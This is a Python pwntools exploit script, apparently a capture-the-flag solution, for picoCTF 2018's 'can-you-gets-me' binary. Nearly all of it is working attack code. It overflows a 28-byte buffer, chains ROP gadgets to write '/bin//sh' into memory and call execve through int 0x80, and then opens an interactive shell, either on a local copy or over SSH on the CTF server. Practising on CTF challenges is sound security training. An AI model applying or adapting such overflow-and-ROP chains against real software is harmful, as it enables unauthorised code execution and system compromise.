#!/usr/bin/env python

from pwn import *
from struct import pack
import sys
argc = len(sys.argv)

LOCAL = True

'''
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
+++ killed by SIGSEGV +++
Segmentation fault
~/ctf_writeups/pico2018/binary/can-you-gets-me# python -c 'print "A"*28+"BBBB"' | strace ./gets
'''
BUF = 28
context.arch = "i386"

payload = 'A'*BUF
payload += pack('<I', 0x0806f19a) # pop edx ; ret
payload += pack('<I', 0x080ea060) # @ .data
payload += pack('<I', 0x080b84d6) # pop eax ; ret
payload += '/bin'
payload += pack('<I', 0x08054b4b) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806f19a) # pop edx ; ret
payload += pack('<I', 0x080ea064) # @ .data + 4
payload += pack('<I', 0x080b84d6) # pop eax ; ret
payload += '//sh'
payload += pack('<I', 0x08054b4b) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x0806f19a) # pop edx ; ret
payload += pack('<I', 0x080ea068) # @ .data + 8
payload += pack('<I', 0x08049473) # xor eax, eax ; ret
payload += pack('<I', 0x08054b4b) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x080481c9) # pop ebx ; ret
payload += pack('<I', 0x080ea060) # @ .data
payload += pack('<I', 0x080dece1) # pop ecx ; ret
payload += pack('<I', 0x080ea068) # @ .data + 8
payload += pack('<I', 0x0806f19a) # pop edx ; ret
payload += pack('<I', 0x080ea068) # @ .data + 8
payload += pack('<I', 0x08049473) # xor eax, eax ; ret
payload += pack('<I', 0x0807ab7f) # inc eax ; ret
payload += pack('<I', 0x0807ab7f) # inc eax ; ret
payload += pack('<I', 0x0807ab7f) # inc eax ; ret
payload += pack('<I', 0x0807ab7f) # inc eax ; ret
payload += pack('<I', 0x0807ab7f) # inc eax ; ret
payload += pack('<I', 0x0807ab7f) # inc eax ; ret
payload += pack('<I', 0x0807ab7f) # inc eax ; ret
payload += pack('<I', 0x0807ab7f) # inc eax ; ret
payload += pack('<I', 0x0807ab7f) # inc eax ; ret
payload += pack('<I', 0x0807ab7f) # inc eax ; ret
payload += pack('<I', 0x0807ab7f) # inc eax ; ret
payload += pack('<I', 0x0806cd95) # int 0x80


def exploit(p):
	p.recvuntil("GIVE ME YOUR NAME!\n")
	p.sendline(payload)
	p.interactive()


if __name__ == '__main__':
	if argc > 1:
		LOCAL = False
		from getpass import getpass
		ssh = ssh(host='2018shell.picoctf.com', user='ems3t', password=getpass())
		p = ssh.process('gets', cwd='/problems/can-you-gets-me_0_8ac5bddeab74e647cd6d31642246a12a')
		exploit(p)
	else:
		p = process('./gets')
		exploit(p)